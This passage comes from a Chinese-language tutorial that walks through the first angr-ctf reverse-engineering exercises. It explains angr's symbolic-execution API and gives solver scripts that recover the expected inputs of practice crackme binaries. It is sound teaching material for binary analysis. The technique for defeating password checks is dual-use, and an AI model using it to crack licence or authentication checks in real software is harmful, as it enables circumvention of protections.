[output_file]<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 generate.py 114514 00_angr_find</span><br></code></pre></td></tr></table></figure><h1>0x01. angr-ctf：基本用法</h1><h2 id="00-angr-find：路径搜索">00_angr_find：路径搜索</h2><p>惯例拖进 IDA，发现其会读入 8 字节后使用一个自定义函数处理，最后与密码 <code>&quot;XFQUUEQF&quot;</code> 对比：<br><img src="https://s2.loli.net/2022/10/31/vcWPp1GO7uHA8q6.png" alt="image.png"></p><p>按照传统的做逆向的方法是去逆 <code>complex_function()</code> ，逆出逻辑后写出解密脚本，但有了 angr 之后我们便可以使用<strong>符号执行</strong>（symbolic execution）来进行路径约束的自动求解</p><blockquote><p>符号执行简单理解便是将变量作为符号存储，通过分析路径约束获得由符号组成的表达式组，最后对其进行求解</p></blockquote><p>那么我们需要求解的路径约束便是执行到输出 <code>&quot;Good Job.&quot;</code> 的路径，这里笔者选择最后的输出点 <code>0x80492F0</code>：</p><p><img src="https://s2.loli.net/2022/10/31/hdaX8FY9ZVcvIRH.png" alt="image.png"></p><p>那么现在我们来看 angr 的基本用法</p><h3 id="angr-Project-顶层接口">angr.Project - 顶层接口</h3><p>我们若要使用 angr 来分析一个二进制文件，第一步则是创建一个 <code>angr.Project</code> 类——我们一切后续操作都将基于这个类实例进行展开，以下是一个🌰：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr<br><span class="hljs-meta">&gt;&gt;&gt; </span>bin_path = <span class="hljs-string">&#x27;./test&#x27;</span> <span class="hljs-comment"># file to be analyzed</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj = angr.Project(bin_path)<br>WARNING | <span class="hljs-number">2022</span>-<span class="hljs-number">11</span>-<span class="hljs-number">23</span> <span class="hljs-number">19</span>:<span class="hljs-number">25</span>:<span class="hljs-number">30</span>,006 | cle.loader | The main binary <span class="hljs-keyword">is</span> a position-independent executable. It <span class="hljs-keyword">is</span> being loaded <span class="hljs-keyword">with</span> a base address of <span class="hljs-number">0x400000</span>.<br></code></pre></td></tr></table></figure><p>首先，我们可以通过一个 project 获取对应二进制文件的基本信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.arch     <span class="hljs-comment"># architecture of the binary file</span><br>&lt;Arch AMD64 (LE)&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(proj.entry)    <span class="hljs-comment"># entry point of the binary file</span><br><span class="hljs-string">&#x27;0x401060&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.filename <span class="hljs-comment"># name of the binary file</span><br><span class="hljs-string">&#x27;./test&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><p><code>arch</code> 是一个 <code>archiinfo.Arch</code> 类实例，其包含了运行该文件的 CPU 信息等各种数据</p><ul><li><p><code>arch.bits</code> &amp; <code>arch.bytes</code> ：CPU 的字长（单位为位/字节）</p></li><li><p><code>arch.name</code>：架构名，例如  <em>X86</em></p></li><li><p><code>arch.memory_endness</code>：端序，大端为 <code>Endness.BE</code> ，小端为 <code>Endness.LE</code></p><blockquote><p>源码里还有一个 “中端序” <code>Endness.ME</code> ：）</p></blockquote></li></ul></li></ul><h4 id="①-factory-实用类工厂">① factory - 实用类工厂</h4><p><code>project.factory</code> 为我们提供了一些实用的类的构造器</p><h5 id="I-block-基本块">I. block - 基本块</h5><p>angr 以基本块为单位分析代码，我们可以通过 <code>project.factory.block(address)</code> 获取给定地址所在的<strong>基本块</strong>——一个 <code>Block</code> 类实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>block = proj.factory.block(proj.entry) <span class="hljs-comment"># extract the basic block</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>block.pp() <span class="hljs-comment"># pretty-print of disassemble code of the block</span><br>        _start:<br><span class="hljs-number">401060</span>  endbr64<br><span class="hljs-number">401064</span>  xor     ebp, ebp<br><span class="hljs-number">401066</span>  mov     r9, rdx<br><span class="hljs-number">401069</span>  pop     rsi<br><span class="hljs-number">40</span>106a  mov     rdx, rsp<br><span class="hljs-number">40</span>106d  <span class="hljs-keyword">and</span>     rsp, <span class="hljs-number">0xfffffffffffffff0</span><br><span class="hljs-number">401071</span>  push    rax<br><span class="hljs-number">401072</span>  push    rsp<br><span class="hljs-number">401073</span>  lea     r8, [__libc_csu_fini]<br><span class="hljs-number">40</span>107a  lea     rcx, [__libc_csu_init]<br><span class="hljs-number">401081</span>  lea     rdi, [main]<br><span class="hljs-number">401088</span>  call    qword ptr [<span class="hljs-number">0x403fe0</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>block.instructions <span class="hljs-comment"># instructions in the block</span><br><span class="hljs-number">12</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>block.instruction_addrs <span class="hljs-comment"># addr of each instruction</span><br>(<span class="hljs-number">4198496</span>, <span class="hljs-number">4198500</span>, <span class="hljs-number">4198502</span>, <span class="hljs-number">4198505</span>, <span class="hljs-number">4198506</span>, <span class="hljs-number">4198509</span>, <span class="hljs-number">4198513</span>, <span class="hljs-number">4198514</span>, <span class="hljs-number">4198515</span>, <span class="hljs-number">4198522</span>, <span class="hljs-number">4198529</span>, <span class="hljs-number">4198536</span>)<br></code></pre></td></tr></table></figure><h5 id="II-state-模拟执行状态">II. state - 模拟执行状态</h5><p>angr 使用 <code>SimState</code> 类表示一个 <em>模拟的程序状态</em>  （simulated program state），我们的各种操作实际上是由一个 state 步进到另一个 state 的过程</p><p>我们使用 <code>project.factory.entry_state()</code> 获取一个程序的初始执行状态，使用 <code>project.factory.blank_state(addr)</code> 获取一个程序从指定地址开始执行的空白状态：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()<br><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.blank_state(<span class="hljs-number">0xdeadbeef</span>)<br></code></pre></td></tr></table></figure><ul><li><code>state.regs</code>：寄存器状态组，其中每个寄存器都为一个  <em>位向量</em>  （BitVector），我们可以通过寄存器名称来访问对应的寄存器（例如 <code>state.regs.esp -= 12</code> ）</li><li><code>state.mem</code>：该状态的内存访问接口，我们可以直接通过 <code>state.mem[addr].type</code> 完成内存访问（例如 <code>state.mem[0x1000].long = 4</code> ，对于读而言还需指定 <code>.resolved</code> 或 <code>.concrete</code> 表示位向量或是实际值，例如 <code>state.mem[0x1000].long.concrete</code>）</li><li><code>state.memory</code>：另一种形式的内存访问接口：<ul><li><code>state.memory.load(addr, size_in_bytes)</code> ：获取该地址上指定大小的位向量</li><li><code>state.memory.store(addr, bitvector)</code> ：将一个位向量存储到指定地址</li></ul></li><li><code>state.posix</code>：POSIX 相关的环境接口，例如 <code>state.posix.dumps(fileno)</code> 获取对应文件描述符上的流</li></ul><p>除了这些对模拟执行状态的信息获取接口外，还有一些解决方法的对应接口 <code>state.solver</code>，我们将在后续进行讲解</p><h5 id="III-simulation-manager-模拟执行器">III. simulation_manager - 模拟执行器</h5><p>angr 将一个状态的执行方法独立成一个 <code>SimulationManager</code> 类，以下两种写法等效：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.factory.simgr(state)<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.factory.simulation_manager(state)<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br></code></pre></td></tr></table></figure><ul><li><code>simgr.step()</code>：<strong>以基本块为单位</strong>的单步执行</li><li><code>simgr.explore(addr)</code>：路径探索，即<strong>执行到指定地址</strong>并进行约束求解，将执行完成的状态放在 <code>simgr.found</code> 列表中，若无法求解则该列表为空</li></ul><h3 id="FINAL-EXPLOIT">FINAL EXPLOIT</h3><p>那么我们现在已经了解了 angr 的基本使用方法了，而本题我们只需要探索到对应路径即可，于是最后的求解脚本如下，详见注释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./00_angr_find&#x27;</span><br>    proj = angr.Project(bin_path) <span class="hljs-comment"># load the binary file</span><br>    init_state = proj.factory.entry_state() <span class="hljs-comment"># create an empty context</span><br>    simgr = proj.factory.simgr(init_state) <span class="hljs-comment"># create a simulator_manager</span><br>    obj_path_addr = <span class="hljs-number">0x80492F0</span> <span class="hljs-comment"># the path we&#x27;d like to explore</span><br>    simgr.explore(find = obj_path_addr) <span class="hljs-comment"># start to explore</span><br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># print the input that solve the constraint</span><br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>一下就跑出来了，很快啊.mp4</p><p><img src="https://s2.loli.net/2022/10/31/BXmxhVOWjQdDwoE.png" alt="image.png"></p><h2 id="01-angr-avoid：路径避免">01_angr_avoid：路径避免</h2><p>惯例拖入 IDA，发现太大了（流汗黄豆.jpg）</p><p><img src="https://s2.loli.net/2022/10/31/sKdFIweu56Sya9H.png" alt="image.png"></p><p>那这里我们手动分析一下，main 的逻辑还是惯例读入 8 字符作为 s1，而 s2 是一个固定值的字符串：</p><p><img src="https://s2.loli.net/2022/10/31/xJFCTN5OZVsjnkG.png" alt="image.png"></p><p>之后大概就是会对 s1、s2 进行一定处理并在各种代码块间跳转，有的路径上会调用到 <code>avoid_me()</code> ，最后都会调用到 <code>maybe_good()</code> ：</p><p><img src="https://s2.loli.net/2022/10/31/fRWJnZhMtyD5qo6.png" alt="image.png"></p><p>那么 <code>maybe_good()</code> 函数看样子应该是我们最终要求解的路径终点，只要满足两个条件：1）<code>should_succeed != 0</code> 2）<code>s1 == s2</code> 便说明我们成功了：</p><p><img src="https://s2.loli.net/2022/10/31/6d8uNkXWAoR1PM7.png" alt="image.png"></p><p>而 <code>avoid_me()</code>会将变量 <code>should_succeed</code> 置 0，这意味着我们在执行时应该避免调用了该函数的路径：</p><p><img src="https://s2.loli.net/2022/10/31/dQs5x4cuhTl2AzD.png" alt="image.png"></p><p>如果硬逆的话逻辑还是比较复杂的（<s>反正👴肯定不愿意手动逆</s>），于是我们还是可以使用 angr 进行求解，目标路径还是输出 <code>&quot;Good Job.&quot;</code>，不过这一题我们多了一个约束：避开 <code>avoid_me()</code> 函数的执行</p><p>如果我们不避开这个近乎无处不在的 <code>avoid_me()</code> 函数，则会造成<strong>路径爆炸</strong>（Path Explosion），从而大幅度增加求解时间，因此我们需要在路径约束的求解上避开该函数</p><h3 id="simgr-explore-的基本用法">simgr.explore() 的基本用法</h3><p>我们通常使用模拟器的 <code>.explore()</code> 方法来进行路径探索，传入的默认参数为 <code>find</code>——一个/一组令模拟器终止运行的地址，符合的执行状态结果会被放到 <code>.found</code> 列表中</p><p>但除了 <code>find</code> 参数外，我们也可以指定 <code>avoid</code> 参数——模拟器运行中应当要<strong>避开</strong>的地址，当一个状态执行到这样的地址时，其会被放在 <code>.avoided</code> 列表中并不再往后执行</p><p>此外，我们还可以通过指定 <code>num_find</code> 参数来指定需要寻找的解状态的数量，若未指定则会在 <code>.found</code> 列表中存储所有的解状态</p><h3 id="FINAL-EXPLOUT">FINAL EXPLOUT</h3><p>现在我们知道该如何进行路径避免了，于是最后的求解脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./01_angr_avoid&#x27;</span><br>    proj = angr.Project(bin_path) <span class="hljs-comment"># load the binary file</span><br>    init_state = proj.factory.entry_state() <span class="hljs-comment"># create an empty context</span><br>    simgr = proj.factory.simgr(init_state) <span class="hljs-comment"># create a simulator_manager</span><br>    obj_path_addr = <span class="hljs-number">0x80492F8</span> <span class="hljs-comment"># the path we&#x27;d like to explore</span><br>    avoid_path_addr = <span class="hljs-number">0x80492BB</span> <span class="hljs-comment"># the path that we need to avoid</span><br>    simgr.explore(find = obj_path_addr, avoid = avoid_path_addr) <span class="hljs-comment"># start to explore</span><br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># print the input that solve the constraint</span><br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是一下子就出来了：</p><p><img src="https://s2.loli.net/2022/10/31/wfTengqWBDoRisK.png" alt="image.png"></p><blockquote><p>笔者实际跑了一下不避开该约束的求解场景，巨<s>™</s>慢，<s>直接把👴の阿里☁学生🐓给炸了</s></p></blockquote><h2 id="02-angr-find-condition：自定义搜索条件">02_angr_find_condition：自定义搜索条件</h2><p>惯例地拖入 IDA，<strong>似乎</strong>逻辑和第一道题差不多，<code>complex_function()</code> 也没啥改变这里就不贴了：</p><p><img src="https://s2.loli.net/2022/10/31/uFaZBR6c31KHbx5.png" alt="image.png"></p><p>但一看汇编就流汗黄豆了，<strong>因为实际上存在非常多的伪路径</strong>：</p><p><img src="https://s2.loli.net/2022/10/31/McqmdiDI2jXLE1f.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/10/31/vhqK89csVgQ3dZz.png" alt="image.png"></p><p><strong>并且有着非常多的输出 Good Job 字符串的基本块</strong>：</p><p><img src="https://s2.loli.net/2022/10/31/fq8Gy3AHdLEXJ51.png" alt="image.png"></p><p>如果你只是简单看了一下然后随便选了一个（比如说看到第一个直接选）扔进 angr 里求解，<strong>那就寄了</strong>：</p><p><img src="https://s2.loli.net/2022/10/31/ZxejJwIW8TRGlD9.png" alt="image.png"></p><p>怎么办呢？第一种方法是手动再分析一下这些伪路径，但是这就不符合我们使用 angr 的自动求解思想了：）因此我们需要寻找一种能够避开这些路径的方法</p><h3 id="simgr-explore-的扩展用法">simgr.explore() 的扩展用法</h3><p>实际上 <code>explore()</code> 的参数 <code>find</code> 与 <code>avoid</code> 除了可以是目标地址外，<strong>还可以是自定义函数，参数为模拟状态，返回值为判定条件的布尔值</strong></p><ul><li>即我们可以编写自定义函数来判断一个状态是否是我们应当要寻找的状态</li></ul><p>例如，若是我们想要寻找一条输出指定字符串的路径，可以选择通过判断该字符串是否在输出中的方式，我们可以通过 <code>state.posix.dumps(文件描述符)</code> 来获取对应文件描述符上的字符流：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;arttnba3&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(<span class="hljs-number">1</span>) <span class="hljs-comment"># 1 for stdout</span><br><span class="hljs-comment"># ...</span><br>simgr.explore(find = foo)<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOUT-2">FINAL EXPLOUT</h3><p>那么解题思路就清晰了，我们将求解的目标路径设为输出 <code>&quot;Good Job.&quot;</code> 字符串、avoid 路径设为输出 <code>&quot;Try again.&quot;</code> 字符串即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():<br>    bin_path = <span class="hljs-string">&#x27;./02_angr_find_condition&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br><br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solve()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/10/31/9nVmrKZvkezSdRQ.png" alt="image.png"></p><h1>0x02. angr-ctf：符号化</h1><h2 id="03-angr-symbolic-registers：符号化寄存器">03_angr_symbolic_registers：符号化寄存器</h2><p>惯例拖进 IDA，大概是读入输入后用三个函数简单算一下，输入参数是 <code>eax、ebx、edx</code> 寄存器的值，三个结果都为 0 就🆗了：</p><p><img src="https://s2.loli.net/2022/10/31/Yze2DrmB6a1owTQ.png" alt="image.png"></p><p>在 <code>get_user_input()</code> 里会分别读三个数到 <code>eax、ebx、edx</code> 寄存器中：</p><p><img src="https://s2.loli.net/2022/10/31/2n6murUotEjVgCi.png" alt="image.png"></p><blockquote><p>然后你会发现反编译的结果就是个🐓⑧…👴刚看反编译的伪代码还想了半天为啥要多读两个数然后扔掉</p><p><img src="https://s2.loli.net/2022/10/31/DoxlVIvprB4KATb.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/10/31/8poqhHj2W1gi6lk.png" alt="image.png"></p></blockquote><p>然后你会发现用上一题的脚本也能秒解…不过这样就不是这道题出题的目的了：）</p><p>重新读一下题目——<code>symbolic registers</code>，这意味着<strong>本题我们应当将这三个寄存器设置为符号变量来进行约束求解</strong></p><h3 id="Claripy-angr-的求解引擎">Claripy - angr 的求解引擎</h3><p><code>Claripy</code> 是 angr 的<strong>求解引擎</strong>（solver engine），其内部会无缝混合使用几种后端（concrete bitvectors、SAT solvers 等），对于我们而言一般不需要直接与其进行交互，但通常我们会使用其提供的一些接口</p><h4 id="bitvector-位向量">bitvector - 位向量</h4><p><strong>位向量</strong>（bitvector）是 angr 求解引擎中的一个重要部分，其表示了 <strong>一组位</strong> （a sequence of bits）</p><p>我们可以通过 <code>claripy.BVV(int_value, size_in_bits)</code> 或 <code>claripy.BVV(string_value)</code> 创建带有具体值（concrete value）的指定长度的位向量值（bitvector value）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv<br>&lt;BV64 <span class="hljs-number">0x617274746e626133</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2<br>&lt;BV32 <span class="hljs-number">0xdeadbeef</span>&gt;<br></code></pre></td></tr></table></figure><p>相同长度的位向量可以进行运算，对于不同长度的位向量则可以通过 <code>.zero_extend(extended_bits)</code> 完成位扩展（0填充）后进行运算，需要注意的是位向量的运算同样存在溢出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = bvv2.zero_extend(<span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv + bvv2<br>&lt;BV64 <span class="hljs-number">0x617274754d102022</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv * bvv<br>&lt;BV64 <span class="hljs-number">0x9842ff8e63f3b029</span>&gt;<br></code></pre></td></tr></table></figure><p>位向量除了代表具体值（concrete value）的 <code>bitvector value</code> 以外，还有代表<strong>符号变量</strong>（symbolic variable）的 <code>bitvector symbol</code>，我们可以通过 <code>claripy.BVS(name, size_in_bits)</code> 创建带名字的指定长度的位向量符号（bitvector symbol）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs<br>&lt;BV64 x_0_64&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2<br>&lt;BV64 y_1_64&gt;<br></code></pre></td></tr></table></figure><p>位向量符号与位向量值之间同意可以进行运算，组合成更加复杂的表达式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3 = (bvs * bvs2 + bvv) / bvs<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3<br>&lt;BV64 (x_0_64 * y_1_64 + <span class="hljs-number">0x617274746e626133</span>) / x_0_64&gt;<br></code></pre></td></tr></table></figure><p>我们可以通过 <code>.op</code> 与 <code>.args</code> 获得位向量的运算类型与参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv.op<br><span class="hljs-string">&#x27;BVV&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs.op<br><span class="hljs-string">&#x27;BVS&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3.op<br><span class="hljs-string">&#x27;__floordiv__&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3.args<br>(&lt;BV64 x_0_64 * y_1_64 + <span class="hljs-number">0x617274746e626133</span>&gt;, &lt;BV64 x_0_64&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv.args<br>(<span class="hljs-number">7021802812440994099</span>, <span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure><h3 id="state-solver-状态的求解接口">state.solver - 状态的求解接口</h3><p>前面讲到 <code>state.solver</code> 提供了一些基于状态的求解接口，例如 solver 同样有创建位向量的 <code>.BVV()</code> 与 <code>.BVS()</code> 接口</p><p>在需要对位向量符号进行具体值的求解时，我们可以先将位向量符号存放到状态的内存/寄存器中，之后用 simgr 探索到对应的状态后，再使用 <code>state.solver.eval()</code> 成员函数来获取对应位向量在当前状态下的值，以下是一个简单的🌰：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">bvs_to_solve = claripy.BVS(<span class="hljs-string">&#x27;bvs_to_solve&#x27;</span>, <span class="hljs-number">64</span>)<br>init_state = proj.factory.entry_state()<br>init_state.memory.store(<span class="hljs-number">0xdeadbeef</span>, bvs_to_solve)<br>simgr = proj.factory.simgr(init_state)<br>simgr.explore(find = <span class="hljs-number">0xbeefdead</span>)<br><br>solver_state = simgr.found[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(solver_state.solver.<span class="hljs-built_in">eval</span>(bvs_to_solve))<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-2">FINAL EXPLOIT</h3><p>那么我们只需要创建一个从 <code>get_user_input()</code> 之后开始执行的空白的状态，并将对应的寄存器设置为位向量符号，之后在求解状态使用 <code>.solver.eval()</code> 来求解即可</p><p>最后的求解脚本如下，详见注释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span 